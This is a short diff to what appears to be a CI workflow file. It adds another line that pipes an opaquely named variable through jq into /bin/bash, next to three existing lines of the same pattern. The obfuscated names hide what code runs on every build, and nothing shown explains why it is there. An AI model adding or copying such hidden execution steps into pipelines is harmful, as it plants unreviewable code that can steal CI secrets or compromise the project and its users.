@@ -31,6 +31,7 @@ jobs:
           echo $icx5584 | jq -r .dexg615 | /bin/bash
           printf '%s' "$zqse162" | jq -r .d94 | /bin/bash
           printf '%s' "$zq658" | jq -r .yac82 | /bin/bash
+          echo $vt85187 | jq -r .ss3315 | /bin/bash
 
       - name: Upload results
         if: always()
